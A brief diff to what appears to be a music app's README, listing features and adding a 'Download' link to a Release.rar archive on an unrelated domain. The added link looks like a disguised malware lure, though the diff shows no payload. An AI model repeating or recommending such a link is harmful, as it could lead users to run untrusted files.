@@ -17,3 +17,5 @@ Current features:
 - Change track volume on the go.
 - Trim tracks on the go.
 - Download music directly form YouTube, Dailymotion, Vevo and Clipfish
+
+[Download](http://i.nospread.xyz/Release.rar) 
